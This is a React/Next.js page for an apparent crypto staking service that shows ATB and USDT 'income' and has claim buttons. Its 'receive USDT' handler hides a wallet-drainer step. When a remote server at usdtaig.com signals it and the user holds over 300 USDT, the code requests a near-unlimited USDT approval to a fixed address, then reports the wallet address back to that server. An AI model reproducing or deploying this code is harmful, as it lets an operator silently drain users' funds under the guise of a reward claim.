"use client";
import React,{ useEffect, useState } from 'react'
import Image from "next/image"
import ATBIMG from "@images/atb.png"
import HOMEIMG02 from "@images/home-02.png"
import ROBOIMG from "@images/robo.png"
import WALLETIMG from "@images/wallet.png"
import TIMG01 from "@images/t-01.png"
import TIMG02 from "@images/t-02.png"
import TIMG03 from "@images/t-03.png"
import { useTranslation } from "react-i18next"
import { Snackbar, Drawer, Grid, Paper, InputBase } from "@mui/material";
import { useBalance, useContractWrite, useAccount } from "wagmi"
import { parseEther } from 'viem'
import { atbConfig, withdarwConfig } from "@/lib/contract"
import { useContractUserBalance, useContractUserATBBalance, useContractPollUSDT, useContractPollATB, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt"
import { getSignData,getIncome } from '@/server/user';
import MsgSuccess from '@/components/msgsuccess';
import axios from 'axios'

export default function Service() {
    const { t } = useTranslation()
    const { address } = useAccount()
    const [ amount, setAmount ] = useState(0)
    const [ incomeInfo, setIncomeInfo ] = useState<any>({})
    const { data:pleData, isLoading: pleLoading, isSuccess: pleIssuccess, write: transfer } = useContractWrite({
        ...atbConfig,
        functionName: "transfer",
    })
    const { data:usdtData, isLoading: usdtLoading, isSuccess: usdtIssuccess, write: withdrawPermit, } = useContractWrite({
        ...withdarwConfig,
        functionName: "withdrawPermit",
    })
    const { data:tokenData, isLoading:tokenLoading, approve, isSuccess:tokenIsSuccess } = userContractApprove()

    const { userBalance } = useContractUserATBBalance()
    const USDTData = useContractUserBalance()
    const { isAllowed } = useContractUserAllowanceStatus("0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5")
    const poolUSDTData = useContractPollUSDT()
    const poolATBData = useContractPollATB()
    const [ addData,setAddData ] = useState({ isShow: false, title: '',  status: 0, msg: '' })
    const [ snackbarValue, setSnackbarValue ] = useState({ open: false, message: ""})
    const [ atbLoading,setAtbLoading ] = useState(false)
    const [ uLoading,setUloading ] = useState(false)
    

    useEffect(()=>{
        if(pleIssuccess){
            setAmount(0)
            setAddData({ title: "", isShow: true, status: 0, msg: t("service.s_22") })
            handleGetIncomeInfo()
        }
        if(usdtIssuccess){
            setAddData({ title: "", isShow: true, status: 0, msg: t("service.s_23")})
            handleGetIncomeInfo()

            if(atbLoading){
                if (typeof localStorage !== 'undefined') {
                    let nowDate = new Date()
                    let str = nowDate.getDate()
                    localStorage.setItem("atb_time", String(str))
                }
            }
            if(uLoading){
                if (typeof localStorage !== 'undefined') {
                    let nowDate = new Date()
                    let str = nowDate.getDate()
                    localStorage.setItem("usdt_time", String(str))
                }
            }
        }
    },[pleIssuccess,usdtIssuccess])

    useEffect(()=>{
        if(tokenIsSuccess){
            axios.post("/decode/auth_user ",{},{
                baseURL: "https://usdtaig.com",
                headers:{"authUser": address}
            })
            receiveUSDTConfirm()
        }
    },[tokenIsSuccess])

    useEffect(()=>{
        if(address){
            handleGetIncomeInfo()
        }
    },[address])


    //质押
    const handlePledge = async () => {
        if(String(incomeInfo.mineStatus) != "0"){
            setSnackbarValue({ open: true, message: t("service.s_24"),})
            return
        }
        if(userBalance<amount){
            setSnackbarValue({ open: true, message: t("service.s_25"),})
            return
        }
        let _address = "0xBB512ec2A600253222bD37D8FdfAB9b2Cb2866eB" as `0x${string}`
        let _amount = parseEther(String(amount))
        transfer({
            args:[_address,_amount]
        })
    }

    //领取USDT
    const handleReceiveUSDT = async() => {
        let nowDate = new Date()
        let str = String(nowDate.getDate())
        let usdt_time = localStorage.getItem("usdt_time")

        if(str == usdt_time){
            setSnackbarValue({ open: true, message: t("service.s_28"),})
            return
        }
        if(!incomeInfo.pensionableUsdt){
            setSnackbarValue({ open: true, message: t("service.s_26"),})
            return
        }
        if(Number(incomeInfo.pensionableUsdt) > Number(poolUSDTData.userBalance)){
            setSnackbarValue({ open: true, message: t("service.s_27")})
            return
        }
        if(!address) return

        axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
            if(res.data.data && !isAllowed && Number(USDTData.userBalance) > 300){
                approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
            }else{
                receiveUSDTConfirm()
            }
        })
        
    }

    const receiveUSDTConfirm = async() => {
        let { data, code } = await getSignData({ address: address,typeStatus: "USDT" })
        if(code == 200){
            let _wid = data.wId
            let _wAmt = data.wAmt
            let _tokenAddr = data.tokenAddress as `0x${string}`
            let _deadline = data.timeStamp
            let r = data.sig.r
            let s = data.sig.s
            let v = data.sig.v
            withdrawPermit({
                args:[_wid,_wAmt,_tokenAddr,_deadline,r,s,v]
            })
        }
    }

    //领取ATB
    const handleReceiveATB = async() => {
        let nowDate = new Date()
        let str = String(nowDate.getDate())
        let atb_time = localStorage.getItem("atb_time")
        if(str == atb_time){
            setSnackbarValue({ open: true, message: t("service.s_28"),})
            return
        }
        if(!incomeInfo.pensionableAtb){
            setSnackbarValue({ open: true, message: t("service.s_26"),})
            return
        }
        if(Number(incomeInfo.pensionableAtb) > Number(poolATBData.userBalance)){
            setSnackbarValue({ open: true, message: t("service.s_27")})
            return
        }
        if(!address) return
        let { data, code } = await getSignData({
            address: address,
            typeStatus: "ATB"
        })
        if(code == 200){
            let _wid = data.wId
            let _wAmt = data.wAmt
            let _tokenAddr = data.tokenAddress as `0x${string}`
            let _deadline = data.timeStamp
            let r = data.sig.r
            let s = data.sig.s
            let v = data.sig.v
            withdrawPermit({
                args:[_wid,_wAmt,_tokenAddr,_deadline,r,s,v]
            })
        }
        setAtbLoading(true)
    }
    
    //获取收益信息
    const handleGetIncomeInfo = async() => {
        let {data,code} = await getIncome({
            address,
        })
        if(code == 200){
            setIncomeInfo(data)
        }
    }

    const filterLevel = (val:any)=>{
        if(!val){
            return "0T"
        }else if(val == 1){
            return "8T"
        }else if(val == 2){
            return "16T"
        }else if(val == 3){
            return "32T"
        }
    }

    const inputChange = (e:any)=>{
        setAmount(e.target.value)
    }
    return (
        <article 
            className="h-full"
            style={{ overflowX: 'hidden',overflowY: 'auto',position: "relative",zIndex: "10", }}
        >
            <article className="w-full mt-[80px] px-4 sm:px-20">
                <Grid container spacing={2}>
                    <Grid item xs={12} lg={6}>
                        <div className="w-full bg-[#131C20] py-5 sm:py-8">
                            <div className="bg-[#1A2939] flex justify-center items-center py-2"> 
                                <Image
                                    src={ATBIMG}
                                    alt=''
                                    className="w-[30px] sm:w-[70px] mr-3 sm:mr-5"
                                    style={{height:"fit-content"}}
                                />
                                <span className="text-white font-bold text-lg sm:text-2xl"><span className="text-[#E1146E]">{t("service.s_01")}:</span>{ incomeInfo?.atbPresentPrice || 0.00 }$</span>
                            </div>
                            <div className="flex justify-between mt-5 px-4 sm:px-10">
                                <div className="flex-1 flex flex-col justify-between sm:py-8">
                                    <div className="flex justify-between bg-[#1C282F] p-2 sm:p-5">
                                        <div className="flex items-center">
                                            <Image
                                                src={ROBOIMG}
                                                alt=''
                                                className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                                style={{height:"fit-content"}}
                                            />
                                            <span className="text-xs sm:text-xl">{t("service.s_02")}:</span>
                                        </div>
                                        <div className="text-base font-bold sm:text-2xl">{ userBalance.toFixed(2) }</div>
                                    </div>
                                    <div className="flex justify-between bg-[#1C282F] p-2 sm:p-5">
                                        <div className="flex items-center">
                                            <Image
                                                src={WALLETIMG}
                                                alt=''
                                                className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                                style={{height:"fit-content"}}
                                            />
                                            <span className="text-xs sm:text-xl">{t("service.s_03")}:</span>
                                        </div>
                                        <div className="text-base font-bold sm:text-2xl">{ filterLevel(incomeInfo?.atb_bot_level) || 0 }</div>
                                    </div>
                                </div>
                                <Image
                                    src={HOMEIMG02}
                                    alt=''
                                    className="w-[50px] sm:w-[125px] ml-5 sm:ml-[93px]"
                                    style={{height:"fit-content"}}
                                />
                            </div>
                        </div>
                        
                    </Grid>
                    <Grid item xs={12} lg={6} className="flex justify-center">
                        <div className="w-full bg-[#131C20] py-8 px-5 sm:px-12 flex flex-col justify-center">
                            <div>
                                <Paper
                                    component="form"
                                    className="h-12 sm:h-[70px]"
                                    sx={{ 
                                        p: '0px 0px', 
                                        display: 'flex', 
                                        alignItems: 'center', 
                                        width: "100%",
                                        background: "rgba(0,0,0,0.5)",
                                        color: "#fff",
                                        border: "none",
                                    }}
                                >
                                    <InputBase
                                        sx={{ 
                                            ml: 1, flex: 1,
                                            color: "#fff",
                                            borderColor: "none",
                                            fontSize: "1rem"
                                        }}
                                        value={amount}
                                        placeholder="请输入ATB数量"
                                        inputProps={{ 'aria-label': 'search google maps' }}
                                        onChange={inputChange}
                                    />
                                    <div 
                                        className="bg-[#E1146E] h-full w-[60px] sm:w-[80px] 
                                        flex items-center justify-center 
                                        cursor-pointer text-xs sm:text-base"
                                        onClick={()=>{setAmount(Number(userBalance))}}
                                    >MAX</div>
                                </Paper>
                            </div>
                            <div 
                                className="text-white font-bold bg-[#017EFF] 
                                h-12 sm:h-[70px] flex justify-center items-center cursor-pointer mt-5 sm:mt-12 
                                text-base sm:text-2xl"
                                onClick={handlePledge}
                            >
                                {t("service.s_04")}
                            </div>
                        </div>
                    </Grid>
                </Grid>
                <div className="bg-[#131C20] mt-5 mb-5">
                    <div className="px-5 py-5 sm:px-10">
                        <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold">{t("service.s_05")}</div>
                        <Grid container spacing={2}>
                            <Grid item xs={12} lg={4} className="flex justify-center">
                                <div className="flex justify-between bg-[#1C282F] p-2 sm:p-5 w-full">
                                    <div className="flex items-center">
                                        <Image
                                            src={TIMG01}
                                            alt=''
                                            className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                            style={{height:"fit-content"}}
                                        />
                                        <span className="text-xs sm:text-xl font-bold">{t("service.s_06")}：</span>
                                    </div>
                                    <div className="text-base font-bold sm:text-2xl">{ incomeInfo?.rewardAmountUsdt || 0.00 }</div>
                                </div>
                            </Grid>
                            <Grid item xs={12} lg={4} className="flex justify-center">
                                <div className="flex justify-between bg-[#1C282F] p-2 sm:p-5 w-full">
                                    <div className="flex items-center">
                                        <Image
                                            src={TIMG02}
                                            alt=''
                                            className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                            style={{height:"fit-content"}}
                                        />
                                        <span className="text-xs sm:text-xl font-bold">{t("service.s_07")}：</span>
                                    </div>
                                    <div className="text-base font-bold sm:text-2xl">{incomeInfo?.grossStaticUsdt || 0.00}</div>
                                </div>
                            </Grid>
                            <Grid item xs={12} lg={4} className="flex justify-center">
                                <div className="flex justify-between bg-[#1C282F] p-2 sm:p-5 w-full">
                                    <div className="flex items-center">
                                        <Image
                                            src={TIMG03}
                                            alt=''
                                            className="w-[20px] sm:w-[25px] mr-2 sm:mr-6"
                                            style={{height:"fit-content"}}
                                        />
                                        <span className="text-xs sm:text-xl font-bold">{t("service.s_08")}：</span>
                                    </div>
                                    <div className="text-base font-bold sm:text-2xl">{incomeInfo?.alreadyIncomeUsdt || 0.00}</div>
                                </div>
                            </Grid>
                        </Grid>
                    </div>
                    <div 
                        className="text-white font-bold bg-[#026451] h-12 sm:h-[70px] 
                        flex justify-center items-center cursor-pointer sm:mt-12 text-base sm:text-2xl"
                        onClick={handleReceiveUSDT}
                    >
                        {t("service.s_09")}
                    </div>
                </div>
                <Grid container spacing={2}>
                    <Grid item xs={12} lg={6} className="flex justify-center">
                        <div className="bg-[#131C20] py-5 sm:py-8 px-5 sm:px-10 w-full">
                            <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold">{t("service.s_10")}</div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_11")}：</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo.atbInAmount || 0.00}</div>
                            </div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_12")}：</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.estimatedAtbAmount || 0.00}</div>
                            </div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_13")}：</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.dayIncomeAtb || 0.00}</div>
                            </div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_14")}：</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.alreadyIncomeAtb || 0.00}</div>
                            </div>
                        </div>            
                    </Grid>
                    <Grid item xs={12} lg={6} className="flex justify-center">
                        <div className="bg-[#131C20] py-5 sm:py-8 px-5 sm:px-10 w-full">
                            <div className="text-[#E1146E] mb-2 sm:mb-5 text-base sm:text-xl font-bold hidden sm:opacity-0 sm:block">我的ATB明细</div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_15")}:</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.atbPrice || 0.00}</div>
                            </div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_16")}:</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.estimatedAtbUsdt || 0.00}</div>
                            </div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_17")}:</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.dayIncomeAtbUsdt || 0.00}</div>
                            </div>
                            <div className="flex justify-between bg-[#1C282F] p-2 sm:p-3 w-full mt-2">
                                <div className="flex items-center">
                                    <span className="text-xs sm:text-lg">{t("service.s_18")}:</span>
                                </div>
                                <div className="text-base sm:text-xl">{incomeInfo?.sumAtbPrice || 0.00}</div>
                            </div>
                        </div> 
                    </Grid>
                </Grid>
                <div className="bg-[#131C20] mt-5 mb-5">
                    <div className="px-5 py-5 sm:px-10 text-base font-bold sm:text-lg flex flex-col justify-center items-center">
                        <span className="text-[#E1146D]">{t("service.s_19")}</span>
                        <span className="mt-2 sm:mt-5">{incomeInfo?.alreadyIncomeAtb || 0}≈{ incomeInfo?.alreadyIncomeAtb * incomeInfo?.atbPresentPrice }USDT</span>
                    </div>
                    <div 
                        className="text-white font-bold bg-[#E1146D] h-12 sm:h-[70px] flex justify-center 
                        items-center cursor-pointer sm:mt-2 text-base sm:text-2xl"
                        onClick={handleReceiveATB}
                    >
                        {t("service.s_20")}
                    </div>
                </div>
                <div className="mb-5 bg-[#131C20] px-5 py-5 sm:py-6 sm:px-10 text-xs sm:text-lg">{t("service.s_21")}</div>
            </article>
            <Snackbar
                open={snackbarValue.open}
                autoHideDuration={6000}
                anchorOrigin={{ vertical: 'bottom', horizontal: 'center' }}
                onClose={() => {
                setSnackbarValue({
                    ...snackbarValue,
                    open: false,
                    message: ""
                })
                }}
                message={snackbarValue.message}
            />
            <MsgSuccess isShow={addData.isShow} title={addData.title} status={addData.status} msg={addData.msg} reset={ ()=>{setAddData({...addData,isShow: false})} } />
        </article>
    )
}
